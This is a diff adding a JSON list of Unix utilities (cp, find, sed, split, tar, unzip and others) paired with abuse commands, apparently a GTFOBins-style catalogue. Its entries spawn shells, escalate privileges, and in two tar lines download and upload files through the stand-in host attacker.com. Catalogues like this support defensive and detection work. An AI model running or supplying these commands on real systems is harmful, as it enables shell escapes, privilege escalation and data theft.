@@ -1,0 +1,77 @@
+[
+	{
+		"command": "cp",
+		"function": "privilege-escalation",
+		"code": "cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file"
+	},
+	{
+		"command": "cp",
+		"function": "privilege-escalation",
+		"code": "cp /path/to/input-file /path/to/output-file"
+	},
+	{
+		"command": "find",
+		"function": "file-write",
+		"code": "find / -fprintf /path/to/output-file DATA -quit"
+	},
+	{
+		"command": "find",
+		"function": "shell",
+		"code": "find . -exec /bin/sh \\; -quit"
+	},
+	{
+		"command": "ln",
+		"function": "privilege-escalation",
+		"code": "ln -fs /bin/sh /bin/ln\nln"
+	},
+	{
+		"command": "mv",
+		"function": "privilege-escalation",
+		"code": "mv /path/to/input-file /path/to/output-file"
+	},
+	{
+		"command": "sed",
+		"function": "shell",
+		"code": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts"
+	},
+	{
+		"command": "sed",
+		"function": "shell",
+		"code": "sed e"
+	},
+	{
+		"command": "split",
+		"function": "shell",
+		"code": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts"
+	},
+	{
+		"command": "tar",
+		"function": "download",
+		"code": "tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh"
+	},
+	{
+		"command": "tar",
+		"function": "shell",
+		"code": "echo '/bin/sh 0<&1' >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar xf /path/to/temp-file.tar --to-command /bin/sh"
+	},
+	{
+		"command": "tar",
+		"function": "shell",
+		"code": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+	},
+	{
+		"command": "tar",
+		"function": "shell",
+		"code": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'"
+	},
+	{
+		"command": "tar",
+		"function": "upload",
+		"code": "tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh"
+	},
+	{
+		"command": "unzip",
+		"function": "privilege-escalation",
+		"code": "unzip -K shell.zip\n./sh -p"
+	}
+]
